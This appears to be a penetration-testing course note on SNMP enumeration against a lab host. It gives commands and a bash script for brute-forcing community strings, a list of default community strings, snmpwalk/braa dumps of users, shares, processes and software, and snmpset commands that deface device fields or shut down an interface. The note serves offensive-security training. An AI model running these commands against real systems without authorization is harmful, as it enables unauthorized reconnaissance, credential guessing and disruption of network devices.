---
tags: [module/footprinting, snmp, network-monitoring, udp, level/advanced, practical]
---

# SNMP Enumeration - Practical Application

## Complete SNMP Enumeration Workflow

Phase 1: Service Discovery
Phase 2: Community String Brute Forcing
Phase 3: Information Gathering (snmpwalk)
Phase 4: Bulk Enumeration (braa)
Phase 5: Windows-Specific Enumeration
Phase 6: Write Access Testing
Phase 7: MIB Analysis

---

## Phase 1: Service Discovery

### Nmap UDP Scan

nmap -sU -p161 --script snmp-brute 10.129.14.128

### Nmap SNMP Scripts

ls /usr/share/nmap/scripts/snmp-*

Key scripts:
- snmp-info.nse - Basic SNMP info
- snmp-interfaces.nse - Network interfaces
- snmp-processes.nse - Running processes
- snmp-sysdescr.nse - System description
- snmp-win32-*.nse - Windows-specific info
- snmp-brute.nse - Brute force community strings

### Quick SNMP Check

snmpget -v2c -c public 10.129.14.128 1.3.6.1.2.1.1.1.0

---

## Phase 2: Community String Brute Forcing

### Using onesixtyone

onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

Output:
10.129.14.128 [public] Linux htb 5.11.0-37-generic

### Using nmap snmp-brute

nmap -sU -p161 --script snmp-brute --script-args snmp-brute.communitiesdb=/usr/share/seclists/Discovery/SNMP/snmp.txt 10.129.14.128

### Common Community Strings

public
private
community
all
public
private
c0mrunity
manager
mngt
admin
monitor
server
read
write
readwrite
rw
ro
default
system
cisco
router
switch
hp
ibm
sun
dell
compaq
nokia

### Create Custom Wordlist

crunch 1 10 -o snmp.txt -t public
crunch 1 10 -o snmp.txt -p companyname server backup admin

---

## Phase 3: Information Gathering with snmpwalk

### Basic Walk (All Info)

snmpwalk -v2c -c public 10.129.14.128

### Walk Specific Branches

| OID | Description |
|-----|-------------|
| 1.3.6.1.2.1.1 | System information |
| 1.3.6.1.2.1.2 | Network interfaces |
| 1.3.6.1.2.1.3 | IP addressing |
| 1.3.6.1.2.1.4 | IP parameters |
| 1.3.6.1.2.1.5 | ICMP statistics |
| 1.3.6.1.2.1.6 | TCP connections |
| 1.3.6.1.2.1.7 | UDP listeners |
| 1.3.6.1.2.1.10 | Transmission media |
| 1.3.6.1.2.1.25 | Host resources |
| 1.3.6.1.4.1 | Vendor-specific info |

### Useful snmpwalk Commands

snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.1   # System info
snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.2   # Interfaces
snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.25.2.2   # Storage
snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.25.4.2.1   # Processes
snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.25.6.3.1.2   # Installed software

### Using Different Versions

snmpwalk -v1 -c public 10.129.14.128
snmpwalk -v2c -c public 10.129.14.128
snmpwalk -v3 -l authNoPriv -u admin -a MD5 -A password 10.129.14.128

---

## Phase 4: Bulk Enumeration with braa

### Install braa

sudo apt install braa

### Basic Usage

braa public@10.129.14.128:.1.3.6.*

### Walk Specific Branch

braa public@10.129.14.128:.1.3.6.1.2.1.1.*
braa public@10.129.14.128:.1.3.6.1.2.1.25.*

### Multiple Targets

braa public@10.129.14.128:.1.3.6.* public@10.129.14.129:.1.3.6.*

### Output to File

braa public@10.129.14.128:.1.3.6.* > snmp-output.txt

---

## Phase 5: Windows-Specific SNMP Enumeration

Windows exposes additional information via SNMP:

### User Accounts

snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.4.1.77.1.2.25

### Shares

snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.4.1.77.1.2.27

### Services

snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.4.1.77.1.2.3.1.1

### Running Software

snmpwalk -v2c -c public 10.129.14.128 1.3.6.1.2.1.25.6.3.1.2

### Windows SNMP OIDs

| OID | Information |
|-----|-------------|
| 1.3.6.1.4.1.77.1.2.25 | Domain users |
| 1.3.6.1.4.1.77.1.2.27 | Domain shares |
| 1.3.6.1.4.1.77.1.2.3.1.1 | Running services |
| 1.3.6.1.4.1.9.9.42.1.2.1.1 | Cisco specific |

---

## Phase 6: Write Access Testing

### Check if Write Access is Possible

Find rwcommunity in config or test with snmpset:

snmpset -v2c -c private 10.129.14.128 1.3.6.1.2.1.1.5.0 s "HACKED"

### What You Can Do with Write Access

- Change device hostname
- Modify network configuration
- Reboot device
- Add/delete users
- Change routing tables
- Disable interfaces
- Upload malicious config

### Dangerous Write Examples

# Change system contact
snmpset -v2c -c private 10.129.14.128 1.3.6.1.2.1.1.4.0 s "hacker@owned.com"

# Change system location
snmpset -v2c -c private 10.129.14.128 1.3.6.1.2.1.1.6.0 s "Compromised"

# Shutdown interface (if applicable)
snmpset -v2c -c private 10.129.14.128 1.3.6.1.2.1.2.2.1.7.1 i 2

---

## Phase 7: MIB Analysis

### List Available MIBs

ls /usr/share/snmp/mibs/

### Download MIBs for Specific Vendors

wget https://raw.githubusercontent.com/cisco/cisco-mibs/main/SNMPv2-SMI.my
wget https://raw.githubusercontent.com/cisco/cisco-mibs/main/SNMPv2-TC.my

### Use MIBs with snmpwalk

snmpwalk -v2c -c public 10.129.14.128 -m ALL
snmpwalk -v2c -c public 10.129.14.128 -m IF-MIB::ifTable

### Common MIBs

| MIB | Description |
|-----|-------------|
| SNMPv2-MIB | Standard system info |
| IF-MIB | Interface information |
| IP-MIB | IP addressing |
| TCP-MIB | TCP connections |
| UDP-MIB | UDP listeners |
| HOST-RESOURCES-MIB | System resources |
| BRIDGE-MIB | Bridge/switch info |
| CISCO-* | Cisco-specific info |

---

## Complete SNMP Enumeration Script

Save as snmp-enum.sh:

#!/bin/bash
TARGET=$1
OUTPUT_DIR="snmp-enum-$TARGET"
mkdir -p $OUTPUT_DIR

echo "[*] Starting SNMP enumeration on $TARGET"

echo "[*] Nmap UDP scan..."
nmap -sU -p161 --script snmp-info $TARGET -oN $OUTPUT_DIR/nmap.txt

echo "[*] Brute forcing community strings..."
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt $TARGET > $OUTPUT_DIR/communities.txt

COMMUNITY=$(grep -o '\[.*\]' $OUTPUT_DIR/communities.txt | head -1 | tr -d '[]')

if [ ! -z "$COMMUNITY" ]; then
    echo "[*] Found community: $COMMUNITY"
    
    echo "[*] Walking system info..."
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.1 > $OUTPUT_DIR/system.txt
    
    echo "[*] Walking interfaces..."
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.2 > $OUTPUT_DIR/interfaces.txt
    
    echo "[*] Walking processes..."
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.4.2.1 > $OUTPUT_DIR/processes.txt
    
    echo "[*] Walking installed software..."
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.2.1.25.6.3.1.2 > $OUTPUT_DIR/software.txt
    
    echo "[*] Checking Windows-specific OIDs..."
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.25 2>/dev/null > $OUTPUT_DIR/windows-users.txt
    snmpwalk -v2c -c $COMMUNITY $TARGET 1.3.6.1.4.1.77.1.2.27 2>/dev/null > $OUTPUT_DIR/windows-shares.txt
fi

echo "[*] SNMP enumeration complete. Check $OUTPUT_DIR/"

---

## Tool Comparison

| Tool | Purpose | Best For |
|------|---------|----------|
| snmpwalk | Full enumeration | Comprehensive data gathering |
| onesixtyone | Community discovery | Finding community strings |
| braa | Bulk enumeration | Fast scanning of many OIDs |
| nmap scripts | Service discovery | Initial footprinting |
| snmpget | Single OID queries | Quick checks |
| snmpset | Write operations | Exploitation |

---

## Key SNMP OIDs for Linux

| OID | Information |
|-----|-------------|
| 1.3.6.1.2.1.1.1.0 | System description |
| 1.3.6.1.2.1.1.3.0 | Uptime |
| 1.3.6.1.2.1.1.4.0 | Contact |
| 1.3.6.1.2.1.1.5.0 | Hostname |
| 1.3.6.1.2.1.1.6.0 | Location |
| 1.3.6.1.2.1.2.2.1.2 | Interface descriptions |
| 1.3.6.1.2.1.2.2.1.6 | MAC addresses |
| 1.3.6.1.2.1.4.20.1.2 | IP addresses |
| 1.3.6.1.2.1.25.4.2.1.2 | Running processes |
| 1.3.6.1.2.1.25.6.3.1.2 | Installed software |

---

## Key Takeaways

- SNMP runs on UDP port 161
- Community strings are "public" (read) and "private" (write)
- SNMPv1 and v2c send everything in plain text
- onesixtyone brute forces community strings
- snmpwalk enumerates all available information
- SNMP can reveal system info, processes, software, users
- Windows exposes additional data via SNMP
- Write access can compromise devices
- braa is fast for bulk OID scanning
- MIBs help interpret OID values
- Always check for SNMP during internal pentests
